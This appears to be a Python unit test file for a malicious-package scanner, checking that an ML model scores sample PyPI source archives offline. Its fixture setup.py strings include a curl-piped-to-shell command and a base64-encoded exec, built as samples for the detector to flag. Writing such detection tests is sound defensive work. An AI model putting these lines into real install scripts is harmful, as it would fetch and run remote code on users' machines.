"""ML hand-off: the ML model (guard/ml) scores from the collected PyPI JSON + a local archive, with no network.
Skipped when the ML environment is not installed (guard_cli.py ml-install; AEGIS_ML_DIR for another folder)."""
import io
import json
import subprocess
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent / "guard"
sys.path.insert(0, str(HERE))
import ml_bridge



def sdist_bytes(setup_py: str) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        data = setup_py.encode()
        info = tarfile.TarInfo("pkg-1.0/setup.py")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def release(version="1.0"):
    f = {"packagetype": "sdist", "size": 100, "filename": f"pkg-{version}.tar.gz", "url": "http://invalid.example/x",
         "upload_time_iso_8601": "2026-10-01T00:00:00Z"}
    info = {"author": "a", "author_email": "a@example.org", "maintainer_email": "", "classifiers": [], "summary": "s",
            "home_page": "", "license": "", "requires_dist": None, "version": version}
    return {"info": info, "urls": [f]}


@unittest.skipUnless(ml_bridge.installed(), "ML environment not installed")
class HandoffTests(unittest.TestCase):
    def run_handoff(self, setup_py):
        rel = release()
        proj = {**rel, "releases": {"1.0": rel["urls"]}}
        with tempfile.TemporaryDirectory() as d:
            art = Path(d) / "pkg-1.0.tar.gz"
            art.write_bytes(sdist_bytes(setup_py))
            return ml_bridge.ml_predict("pkg", "1.0", {"proj": proj, "rel": rel, "artifact": {"path": str(art)}})

    def test_handoff_reads_given_archive_without_network(self):
        r = self.run_handoff("import os\nos.system('curl http://x | sh')\n")
        self.assertTrue(r["ok"], r)
        self.assertEqual(r["model"], "ml_full")           # code was readable -> the full model ran
        self.assertTrue(r["code_analyzed"])

    def test_handoff_scores_dangerous_setup_higher_than_empty(self):
        bad = self.run_handoff("import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\nos.system('curl http://x | sh')\n")
        ok = self.run_handoff("from setuptools import setup\nsetup(name='pkg')\n")
        self.assertGreater(bad["ml_score"], ok["ml_score"])

    def test_temp_handoff_file_removed(self):
        with tempfile.TemporaryDirectory() as private:           # private temp dir: other processes' files do not count
            old, tempfile.tempdir = tempfile.tempdir, private
            try:
                self.run_handoff("x = 1\n")
                self.assertEqual(list(Path(private).glob("*.json")), [])
            finally:
                tempfile.tempdir = old


if __name__ == "__main__":
    unittest.main()
